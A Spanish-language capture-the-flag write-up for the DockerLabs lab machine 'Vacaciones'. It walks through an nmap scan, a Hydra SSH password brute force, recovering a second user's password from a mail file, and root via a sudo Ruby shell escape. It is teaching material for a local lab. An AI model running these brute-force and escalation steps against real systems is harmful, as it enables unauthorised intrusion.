
# Máquina Vacaciones


![inicio](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/inicio-Vacaciones.png)

---

## Escaneo inicial

Iniciamos con un escaneo de puertos usando `nmap` para identificar los servicios expuestos en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -sV -vvv -n -Pn 172.17.0.2
```

Los resultados muestran que los puertos abiertos son:

- **22** (SSH)
- **80** (HTTP)

## Exploración del servicio HTTP

Accedemos al puerto **80** a través del navegador, pero la página está en blanco. Para buscar información oculta, revisamos el código fuente de la página y encontramos el siguiente fragmento:

> De: juan para: camilo, te he dejado un correo es importante

Este mensaje nos proporciona un posible usuario: **camilo**.

## Ataque de fuerza bruta con Hydra

Usamos `Hydra` para intentar obtener la contraseña de acceso SSH de **camilo**, utilizando el diccionario `rockyou.txt`.

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

La herramienta encuentra rápidamente la siguiente contraseña:

**password1**

## Acceso mediante SSH

Nos conectamos al servidor usando las credenciales obtenidas.

```bash
ssh camilo@172.17.0.2
```

## Búsqueda de información en el sistema

Una vez dentro, revisamos si hay archivos de interés en el directorio de correo.

```bash
cd /var/mail
cd camilo
ls
```

Encontramos un archivo llamado `correo.txt`, lo inspeccionamos con `cat`.

```bash
cat correo.txt
```

Este archivo contiene una contraseña: **2k84dicb**. Es probable que esta contraseña pertenezca a otro usuario, en este caso, **juan**.

## Escalada de privilegios

Nos conectamos como **juan** usando la contraseña encontrada.

```bash
ssh juan@172.17.0.2
```

Verificamos los permisos de sudo con el siguiente comando:

```bash
sudo -l
```

El resultado nos muestra que podemos ejecutar **Ruby** con permisos de superusuario:

```bash
(ALL) NOPASSWD: /usr/bin/ruby
```

Usamos `GTFOBins` para encontrar una forma de escalar privilegios con Ruby. Ejecutamos el siguiente comando:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Con esto, obtenemos acceso como **root** y control total sobre la máquina.

---


Esta máquina permitió practicar distintas técnicas de explotación:

- Enumeración de servicios con `nmap`.
- Extracción de información oculta en el código fuente de una página web.
- Uso de `Hydra` para fuerza bruta en SSH.
- Identificación de credenciales en archivos de correo.
- Uso de `GTFOBins` para escalar privilegios.

La importancia de la seguridad en la gestión de credenciales es clara, ya que el uso de contraseñas débiles y la exposición de información pueden comprometer un sistema fácilmente.

⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/

